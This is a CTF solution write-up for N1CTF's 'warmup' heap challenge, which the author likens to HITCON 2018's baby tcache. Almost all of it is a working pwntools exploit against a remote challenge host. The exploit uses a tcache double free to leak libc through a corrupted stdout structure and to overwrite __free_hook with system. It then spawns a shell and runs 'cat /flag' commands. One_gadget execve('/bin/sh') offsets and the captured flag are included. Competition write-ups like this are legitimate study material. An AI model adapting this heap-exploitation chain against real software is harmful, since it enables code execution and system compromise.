# warmup

same as baby tcache from hitcon ctf 2018

## exploit

```python
from pwn import *

# r = process('./warmup', aslr=False)
# r = process('./warmup')
r = remote('47.52.90.3', 9999)

# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
def add(content):
    r.sendlineafter('>>', '1')
    r.sendafter('>>', content)

def modify(index, content, can=True):
    r.sendlineafter('>>', '3')
    r.sendlineafter('index:', str(index))

    if not can:
        return

    r.sendafter('>>', content)



def delete(index):
    r.sendlineafter('>>', '2')
    r.sendlineafter('index:', str(index))


add('a') # 0
add('a') # 1

add('a') # prevent

delete(0)

delete(1)
modify((2 << 31) - 0x4, '', False)
delete(1)

add('\x50\x72')
add('\x50\x72')
add(p64(0) + p32(1361))

add('x')
add('y')

delete(2)

delete(6)
modify((2 << 31) - 0x4, '', False)
delete(6)


add('\x60\x72')
add('\x60\x72')
add('\x60\x72')
delete(7)

# modify

add('\x00') # libc ...
add('\x00') # libc ...

delete(7)
modify((2 << 31) - 0x4, '', False)
delete(7)

add('\xa0\x72')
add('\xa0\x72')
delete(9)
add('\xa0\x72')


modify(8, '\x60\x77') # offset man

delete(9)

delete(7)
delete(5)
delete(6)
delete(2)

add('\xb0\x72')
add('\xb0\x72')
add('\xb0\x72')


add(p64(0xfbad1800) + p64(0)*3 + "\x00")

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

data = r.recvuntil('1.')
print 'wtf', data

leak = u64(data[8:16])

libc_base = leak - 0x3ed8b0
system = libc_base + 0x4f440
free_hook = libc_base + 0x3ed8e8

print 'libc_base', hex(libc_base)
print 'system', hex(libc_base)
print 'free_hook', hex(libc_base)



script = '''
# b *0x555555554000 + 0xd25
# b *0x555555554000 + 0xbfb
c
'''


# gdb.attach(r, script)

delete(4)
delete(2)
modify((2 << 31) - 0x4, '', False)
delete(2)

add(p64(free_hook))
add(p64(free_hook))
add(p64(system))

modify(0, '/bin/sh\x00')
delete(0)



'''
for i in xrange(10):
    delete(i)
'''

'''
raw_input('go')
delete(0)
raw_input('go')
modify((2 << 31) - 0x4, '', False)
'''

with open('/tmp/result', 'wb') as f :
    f.write('zz')

    r.sendline('cat /flag')
    r.sendline('cat /*/flag')
    r.sendline('cat /*/*/flag')

    f.write(r.recv())
    f.write(r.recv())
    f.write(r.recv())
    f.write(r.recv())
    f.write(r.recv())
    f.write(r.recv())
    f.write(r.recv())


r.interactive()
```

- flag: N1CTF{0359e2a5bf6222aa34bb22b7c099adda}
